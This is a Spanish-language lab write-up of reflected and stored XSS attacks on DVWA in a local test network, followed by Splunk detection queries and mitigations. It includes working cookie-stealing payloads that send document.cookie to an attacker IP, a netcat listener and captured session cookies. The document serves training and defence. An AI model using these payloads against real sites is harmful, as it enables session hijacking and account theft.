# Laboratorio de Seguridad Web: Explotación y Monitoreo de XSS (Reflected & Stored) en DVWA con Splunk

Este repositorio documenta las pruebas de concepto (PoC) de vulnerabilidades **Cross-Site Scripting (XSS)** realizadas sobre la aplicación **DVWA (Damn Vulnerable Web Application)** montada en un servidor **Ubuntu Server** (`192.168.0.26`), la interacción con el entorno atacante **Kali Linux** (`192.168.0.36`) y el monitoreo centralizado de eventos mediante el **SIEM Splunk**.

---

## Parte 1: Reflected XSS (Pruebas Iniciales)

En la primera fase del laboratorio se analizaron los vectores de ataque **Reflected XSS** en la ruta `/dvwa/vulnerabilities/xss_r/`.

### 1. Pruebas de Ejecución Local (Pop-ups)
Se verificó la falta de sanitización de entrada en el parámetro `name` enviando scripts de prueba:

* **Inyección de Alerta Básica:**
  ```html
  <script>alert('XSS')</script>
  ```
  *Resultado:* El navegador ejecutó la función JavaScript mostrando la ventana emergente con el texto `"XSS"`.

* **Lectura de Cookies de Sesión:**
  ```html
  <script>alert(document.cookie)</script>
  ```
  *Resultado:* Se desplegó una alerta exponiendo los valores del token de sesión: `PHPSESSID=s0qbhp47s7g30b1ah1vf9th3bc; security=low`.

### 2. Exfiltración de Cookies mediante Netcat
Se levantó un listener en la máquina de Kali Linux (`192.168.0.36`) escuchando en el puerto 8000:

```bash
nc -lnvp 8000
```

Se inyectó el siguiente payload en el campo vulnerable de Reflected XSS:

```html
<script>new Image().src='http://192.168.0.36:8000/robo?cookie='+encodeURIComponent(document.cookie);</script>
```

*Resultado:* La máquina atacante recibió la petición `GET` HTTP en tiempo real exponiendo la cookie activa:
`GET /robo?cookie=PHPSESSID=r0rej87sosfrc67uf824ofdkq6;%20security=low HTTP/1.1`

### 3. Monitoreo en Splunk (Reflected XSS)
Se ejecutó la siguiente búsqueda SPL en Splunk para registrar la navegación y los sondeos iniciales desde Kali Linux:

```spl
index=main sourcetype=access_combined clientip=192.168.0.36 uri="*xss*"
| table _time, method, uri, status
| sort _time
```

---

## Parte 2: Stored XSS & Resolución de Problemas de Infraestructura

### 1. Solución de Error HTTP 500 y Reconstrucción de la Base de Datos
Al intentar acceder a la vista de **Stored XSS** (`/dvwa/vulnerabilities/xss_s/`), la aplicación colapsaba con un error **HTTP 500**. El registro de logs de Apache (`/var/log/apache2/error.log`) reveló un fallo de sintaxis SQL debido a incompatibilidades entre la versión de MariaDB/MySQL del Ubuntu Server y el script heredado de DVWA:

`Uncaught mysqli_sql_exception: You have an error in your SQL syntax... near 'IF NOT EXISTS role VARCHAR(20)'`

Para resolver el bloqueo, se habilitó el reporte de errores en PHP y se construyó manualmente la estructura de tablas e índices en MariaDB desde la terminal de Ubuntu:

```bash
# Habilitar reporte de errores en php.ini
sudo nano /etc/php/8.1/apache2/php.ini
# Modificar: display_errors = On

# Reiniciar Apache
sudo systemctl restart apache2

# Crear base de datos y tablas manualmente en MariaDB
sudo mysql -u root -e "
CREATE DATABASE IF NOT EXISTS dvwa;
USE dvwa;

DROP TABLE IF EXISTS guestbook;
CREATE TABLE guestbook (
  comment_id SMALLINT UNSIGNED NOT NULL AUTO_INCREMENT,
  comment TEXT,
  name TEXT,
  PRIMARY KEY (comment_id)
);

DROP TABLE IF EXISTS users;
CREATE TABLE users (
  user_id INT(6) NOT NULL AUTO_INCREMENT,
  first_name VARCHAR(15) DEFAULT NULL,
  last_name VARCHAR(15) DEFAULT NULL,
  user VARCHAR(15) DEFAULT NULL,
  avatar VARCHAR(70) DEFAULT NULL,
  last_login TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  failed_login INT(3) DEFAULT '0',
  password VARCHAR(255) DEFAULT NULL,
  role VARCHAR(20) DEFAULT 'user',
  PRIMARY KEY (user_id)
);

INSERT INTO users (user_id, first_name, last_name, user, avatar, failed_login, password, role) VALUES 
(1,'Admin','User','admin','/dvwa/hackable/users/admin.png',0,'5f4dcc3b5aa765d61d8327deb882cf99','admin'),
(2,'Gordon','Brown','gordon','/dvwa/hackable/users/gordon.png',0,'e10adc3949ba59abbe56e057f20f883e','user');
"
```

### 2. Modificación de Restricciones del Formulario (maxlength)
El formulario web cortaba los textos a 50 caracteres (`maxlength="50"`), impidiendo el envío de scripts de exfiltración completos. Se ampliaron los límites directamente en el archivo fuente de DVWA y en la estructura de MySQL:

```bash
# Modificar el código PHP de DVWA para ampliar el límite de caracteres
sudo sed -i 's/maxlength="[0-9]*"/maxlength="1000"/g' /var/www/html/dvwa/vulnerabilities/xss_s/index.php

# Expandir el campo en la base de datos
sudo mysql -u root -e "USE dvwa; ALTER TABLE guestbook MODIFY comment TEXT; ALTER TABLE guestbook MODIFY name TEXT;"
```

---

## Parte 3: Explotación y Persistencia de Stored XSS

### 1. Inyección del Payload Persistente
Con el entorno funcional y los límites ampliados, se ingresó al módulo **XSS (Stored)** y se envió el siguiente payload en el campo **Message**:

```html
<script>new Image().src='http://192.168.0.36:8000/steal?cookie='+encodeURIComponent(document.cookie);</script>
```

### 2. Verificación del Impacto
* **Almacenamiento:** El payload se guardó de forma permanente en la tabla `guestbook` de MySQL.
* **Ejecución Automática:** Cada vez que cualquier usuario ingresa o recarga la vista `/dvwa/vulnerabilities/xss_s/`, el navegador interpreta el script en segundo plano sin mostrar texto en la sección de mensajes, ejecutando la exfiltración sin interacción directa del usuario.

---

## Parte 4: Detección y Análisis Forense en Splunk

Se utilizaron consultas en Splunk para auditar la actividad maliciosa registrada por el servidor Apache:

### 1. Auditoría de Inyecciones Stored XSS (Peticiones POST)
Consulta para identificar todos los envíos de formularios hacia el endpoint de Stored XSS:

```spl
index=main sourcetype=access_combined uri_path="*/vulnerabilities/xss_s/*" method=POST
| table _time, clientip, method, uri_path, status
```

*Resultado:* Se identificaron exitosamente los 11 eventos de envío `POST` procesados con código HTTP `200 OK`.

### 2. Inspección de Logs Crudos (Raw Logs)
Para analizar las cabeceras HTTP, User-Agent y marcas de tiempo exactas de cada intento de almacenamiento:

```spl
index=main sourcetype=access_combined uri_path="*/vulnerabilities/xss_s/*" method=POST
```

---

## Conclusiones y Medidas de Mitigación

1. **Sanitización de Entradas:** Implementar la conversión de caracteres especiales a entidades HTML (p. ej. `htmlspecialchars()` en PHP) antes de procesar o almacenar entradas de usuario.
2. **Context-Aware Output Encoding:** Asegurar que los datos recuperados de la base de datos se codifiquen adecuadamente según el contexto de renderizado (HTML, atributos, JS).
3. **Content Security Policy (CSP):** Configurar cabeceras CSP restrictivas para mitigar la ejecución de scripts no autorizados e impedir el envío de datos a orígenes de terceros desconocidos (`connect-src` / `img-src`).
4. **Atributo HttpOnly:** Establecer la bandera `HttpOnly` en la cookie `PHPSESSID` para evitar que los scripts del lado del cliente puedan acceder a tokens de sesión sensible mediante `document.cookie`.
